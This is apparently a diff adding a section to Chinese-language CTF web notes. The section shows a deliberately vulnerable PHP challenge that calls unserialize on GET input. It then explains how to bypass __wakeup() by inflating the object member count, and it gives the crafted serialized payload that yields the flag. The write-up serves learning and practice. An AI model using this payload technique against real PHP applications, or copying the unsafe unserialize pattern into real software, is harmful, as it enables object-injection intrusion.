@@ -644,3 +644,73 @@ O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
 
 ![image-20240812180404781](img/1-CTF_WEB/image-20240812180404781.png)
 
+## 6. php反序列化绕过`__weakup()`
+
+题目
+
+```php
+<?php
+
+header("Content-type:text/html;charset=utf-8");
+error_reporting(0);
+show_source("class.php");
+
+class HaHaHa{
+
+
+        public $admin;
+        public $passwd;
+
+        public function __construct(){
+            $this->admin ="user";
+            $this->passwd = "123456";
+        }
+
+        public function __wakeup(){
+            $this->passwd = sha1($this->passwd);
+        }
+
+        public function __destruct(){
+            if($this->admin === "admin" && $this->passwd === "wllm"){
+                include("flag.php");
+                echo $flag;
+            }else{
+                echo $this->passwd;
+                echo "No wake up";
+            }
+        }
+    }
+
+$Letmeseesee = $_GET['p'];
+unserialize($Letmeseesee);
+
+?>
+```
+
+这比上面多了个`__wakeup()` ，在29行程序调用反序列化方法时，会自动执行`__weakup()`函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过`__weakup()`函数；
+
+php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 `__weakup()`; 因而先构造
+
+```php
+$aa = new HaHaHa();
+$aa->admin = "admin";
+$aa->passwd = "wllm";
+$stus = serialize($aa);
+print_r($stus);
+```
+
+得到
+
+```
+O:6:"HaHaHa":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+```
+
+修改得到
+
+```
+O:6:"HaHaHa":3:{s:5:"admin";s:5:"admin";s:6:"passwd";s:4:"wllm";}
+```
+
+上传即可
+
+![image-20240813220240174](./img/1-CTF_WEB/image-20240813220240174.png)
